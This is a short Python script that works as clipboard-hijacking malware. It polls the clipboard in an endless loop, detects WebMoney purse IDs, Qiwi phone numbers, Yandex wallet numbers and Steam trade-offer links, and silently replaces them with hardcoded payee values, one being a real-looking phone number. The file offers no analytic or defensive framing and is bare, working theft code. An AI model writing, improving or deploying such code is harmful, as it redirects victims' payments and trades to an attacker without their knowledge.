import pyperclip

myWMZ = "Z111111111111"
myWMR = "R111111111111"
myWMU = "U111111111111"
mySteam = ""
myQiwi = "+380973613117"
myYandex = ""


def isWebMoney(string):
    if len(string) == 13 or len(string) == 12:
        if string.startswith('Z'):
            return 'Z'
        if string.startswith('R'):
            return 'R'
        if string.startswith('U'):
            return 'U'
    return False


def isYandex(string):
    if 11 <= len(string) <= 16 and string.startswith("410"):
        return True
    return False


def isQiwi(string):
    if string.startswith("+375") or string.startswith("+7") or string.startswith("+373") or string.startswith(
            "+380") or string.startswith("+994") or (len(string) == 11 and string.startswith('8')) or (
            len(string) == 10 and string.startswith('9')):
        return True
    return False


def isSteam(string):
    if string.startswith("https://steamcommunity.com/tradeoffer/new/?partner"):
        return True
    return False


if __name__ == "__main__":
    while True:
        buffer = pyperclip.paste()

        # WebMoney
        wmresult = isWebMoney(pyperclip.paste())
        if wmresult == 'R':
            pyperclip.copy(myWMR)
        if wmresult == 'U':
            pyperclip.copy(myWMU)
        if wmresult == 'Z':
            pyperclip.copy(myWMZ)

        # Qiwi
        if isQiwi(buffer):
            pyperclip.copy(myQiwi)

        # Yandex
        if isYandex(buffer):
            pyperclip.copy(myYandex)

        # Steam
        if isSteam(buffer):
            pyperclip.copy(mySteam)
